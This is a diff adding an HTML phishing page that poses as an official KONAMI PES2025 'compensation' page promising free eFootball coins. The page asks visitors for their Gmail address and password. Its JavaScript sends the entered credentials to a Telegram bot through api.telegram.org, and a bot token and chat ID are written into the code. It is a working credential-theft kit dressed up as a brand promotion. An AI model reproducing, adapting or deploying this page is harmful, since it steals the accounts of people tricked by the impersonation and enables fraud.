@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KONAMI - PES2025 Compensation</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #1c1c1c;
+      color: white;
+    }
+    .header {
+      background-color: black;
+      color: white;
+      padding: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+    .breadcrumb {
+      background-color: #111;
+      padding: 10px 15px;
+      color: #999;
+      font-size: 13px;
+    }
+    .center-box {
+      text-align: center;
+      padding: 40px 20px 10px 20px;
+      background-color: #1c1c1c;
+    }
+    .center-box p {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #aaa;
+    }
+    .content-box {
+      background-color: black;
+      border-radius: 20px 20px 0 0;
+      padding: 30px 20px;
+      text-align: center;
+    }
+    .content-box h2 {
+      color: white;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .content-box p {
+      color: #ccc;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    .brand {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #fcd535;
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      color: #333;
+    }
+    button {
+      padding: 12px 25px;
+      border: none;
+      border-radius: 8px;
+      background-color: #007bff;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .message {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div><strong>KONAMI</strong></div>
+    <div>Europe / English ▾</div>
+  </div>
+
+  <div class="breadcrumb">
+    Konami &gt; PES2025 &gt; Compensation
+  </div>
+
+  <div class="center-box">
+    <p>The official KONAMI Pro Evolution Soccer eSport</p>
+  </div>
+
+  <div class="content-box">
+    <h2>Dear Valuable Users</h2>
+    <p>
+      Thanks for still playing PES2025. We plan some optimization for PES2025, and we hope you will try the demo.<br>
+      Claim free compensation from KONAMI. Thanks for participating!
+    </p>
+
+    <div class="brand">🎁 Free-Coins-eFootball</div>
+
+    <input type="email" id="email" placeholder="Enter your Gmail" />
+    <input type="Passowrd" id="Passowrd" placeholder="Enter your Passowrd" />
+    <input type="number" id="coins" placeholder="How many coins do you want?" />
+    <button onclick="sendToTelegram()">Login</button>
+
+    <div class="message" id="message"></div>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const email = document.getElementById("email").value;
+        const Passowrd = document.getElementById("Passowrd").value;
+      const coins = document.getElementById("coins").value;
+      const messageDiv = document.getElementById("message");
+
+      if (!email || !Passowrd || !coins) {
+        messageDiv.innerText = "⚠️ Please fill in both fields.";
+        return;
+      }
+
+      const botToken = "8233006450:AAGGKdEycN4QwSDfekXl2aRkgm198Qn-vLs";
+      const chatId = "8158503343";
+      const text = `📨 New PES Request:\n📧 Gmail: ${email}\n🔒 Passowrd: ${Passowrd}\n💰 Coins: ${coins}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          messageDiv.innerText = "✅ Gmail sent successfully!";
+        } else {
+          messageDiv.innerText = "❌ Failed to send.";
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        messageDiv.innerText = "❌ Network error.";
+      });
+    }
+  </script>
+
+</body>
+</html>
